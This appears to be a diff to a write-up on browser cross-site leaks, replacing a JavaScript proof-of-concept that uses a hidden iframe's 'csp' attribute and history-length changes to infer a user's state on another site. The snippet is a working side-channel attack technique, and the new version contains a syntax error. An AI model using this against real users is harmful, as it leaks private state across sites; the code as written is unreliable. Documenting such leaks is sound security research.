@@ -22,24 +22,36 @@ For most directives so by trying to apply `img-src 'https://example.com';` to th
 This can be abused if csp attrbutes are set conditionally on user state and embedding is allowed.
 
 ```javascript
-async function ifResticts(URL, csp) {
-    return new Promise((r) => {
-        let f = document.createElement('iframe');
-        f.setAttribute('csp', csp);
-        f.hidden = true;
-        f.src = URL;
-        f.onload = () => {
-            f.onload = () => {
-                f.remove();
-                return r(0);
-            }
-            f.src = URL + '#';
+async function ifResticts(url, csp='default-src \'self\';') => {
+    return new Promise((r)=> {
+        let i = document.createElement('iframe');
+        // attempt to enforce a csp onto the iframe.
+        i.setAttribute('csp', csp);
+        i.src = url;
+        // Hide the iframe
+        i.hidden = true;
+        
+        // get inital history length
+        let h0 = history.length;
+
+        // max history is 50 
+        if(h0 > 48){
+            throw new Error('History to long')
         }
-        let t = setTimeout(() => {
-            f.remove();
-            return r(1);
-        }, 2000);
-        document.body.append(f);
+
+        i.onload = () => {
+            // overwrite onload
+            i.onload = () => {
+                // the length will not increase on a page error such as when not allowed to apply a CSP.
+                let h1 = history.length
+                i.remove();
+                return r(h1 - h0);
+            }
+
+            // reload
+            i.src = url;
+        }
+        document.body.append(i);
     });
 }
 ```
